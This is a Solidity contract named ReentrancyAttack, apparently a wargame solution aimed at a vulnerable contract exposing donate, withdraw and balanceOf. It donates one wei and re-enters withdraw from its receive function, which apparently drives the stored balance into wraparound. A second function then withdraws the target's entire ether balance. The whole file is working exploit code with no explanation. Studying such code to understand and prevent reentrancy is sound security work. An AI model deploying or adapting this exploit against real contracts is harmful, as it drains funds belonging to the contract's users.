// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Reentrancy {
    function withdraw(uint) external;
    function donate(address) external payable; 
    function balanceOf(address) external view returns (uint);
}

contract ReentrancyAttack {
    
  Reentrancy target;

  constructor(address _target) {
    target = Reentrancy(_target);
  }

  function attack_1_causeOverflow() public payable {
    target.donate{value:1}(address(this));
    target.withdraw(1);
  }

  function attack_2_deplete() public {
    target.withdraw(address(target).balance);
  }

  receive() external payable {
    target.withdraw(1);
  }
}